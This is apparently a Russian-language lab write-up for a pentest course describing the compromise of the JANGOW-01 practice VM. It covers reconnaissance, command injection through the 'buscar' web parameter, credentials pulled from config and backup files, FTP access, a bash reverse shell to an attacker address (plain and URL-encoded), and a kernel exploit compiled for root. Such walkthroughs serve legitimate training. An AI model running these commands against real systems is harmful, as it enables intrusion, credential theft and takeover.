# 👁️‍🗨️VM--JANGOW01👁️‍🗨️

🚩 «FTP + LFI + Reverse Shell = 💀». Данный проект представляет собой детальный разбор процесса эксплуатации уязвимостей виртуальной машины JANGOW-01 в рамках лабораторной работы по курсу пентеста.
---


В ходе работы были последовательно применены методы: разведка (nmap), эксплуатация Local File Inclusion (LFI) через веб-параметр, получение доступа по FTP с использованием скомпрометированных учётных данных, загрузка скрипта для анализа уязвимостей ядра (LES.sh), а также установка обратного соединения (reverse shell) и повышение привилегий до root.


🪬Сканирование цели (Nmap, ping, netdiscover)
---

Nmap -sC -sV <<iptargetvm>>
21/tcp open ftp vsfpd 3.0.3
80/tcp open http Apache httpd 2.4.18



🌐 Веб-уязвимость (LFI / RCE)
---

В параметре buscar на странице busque.php была обнаружена уязвимость Local File Inclusion (LFI).
http://192.168.0.181/site/busque.php?buscar=ls
1) ls - показало, что мы можем работать с сайтом, как с терминалом
Вывод: assets busque.php css index.html js wordpress
2) ls -all
3) ls -all wordpress/
4) cat wordpress/config.php - читаем файл (нам стали известны возможные логин и пароль для подключения по ftp порту)
   Но эти данные не подошли, и я решил искать дальше
5) pwd - /var/www/html/site - смотрим путь
6) ls -all /var/www/html/site (находим в этой дериктории .backup)
7) cat -all var/www/html/.backup
   Мы нашли данные для успешного поднлючения по ftp порту
($servername = "localhost";
 $database = "jangow01";
 $username = "jangow01";
 $password = "abquril69")




📁 FTP-доступ
---

Используя найденные учётные данные, удалось войти по FTP:
ftp <<iptargetvm>>
name: jangow01
password: abquril69

Попадаем в среду VM:
1) pwd
2) cd /home/jangow01
3) ls
4) get user.txt - скачали флаг, но это не конец. Мы не овладели правами root.
   ftp порт еще будет нужен для передачи нашего exploit




🐚 Reverse Shell
---

▪︎ Прослушиваем порт 443:
   nc -lnvp 443
(заранее подготовим команду для вставки в url - bash -i >& /dev/tcp/<<ipaddressour>>/443 0>&1')

▪︎ Используем urlencoder для кодировки и вставки в URL:
  %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.175%2F443%200%3E%261%27%0A

▪︎ После connection пишем:
 1) python3 -c 'import pty;pty.spawn("/bin/bash")'
 2) wxport TERM-xterm
 3) su ЛОГИН: (jangow01)
 4) password:_____(мы его уже знаем)
 5) cd /home/jangow01
 6) ls

☁︎ Возвращаемся к терминалу с ftp подключением:
  1) put les.sh (Transfer complete)
--------------------------------------------

▶︎ Возвращаемся к терминалу c прослушкой:
  1) ls (видим наш файл les.sh)
  2) chmod +x les.sh
  3) ./les.sh
  4) Наш exploit сработал, софтом было просканированы уязвимсоти, берем первую CVE
  5) Скачиваем CVE (45010.c)
     
---------------------------------------------
☁︎ Возвращаемся к терминалу с ftp подключением:
   1) put 45010.c  (Transfer complete)
   2) ls (видим наш файл 45010.c)
Мы перекинули опять наш файл, теперь

---------------------------------------------
▶︎ Возвращаемся к терминалу c прослушкой:
   1) ls
   2) gcc -s 45010.c -o 45010
   3) ./45010
   4) id, whoami (root)
      

🌀 Продвигаемся через дериктории до proof.txt - cat (открываем) - ГОТОВО! 🌀
---




 

  


   













 
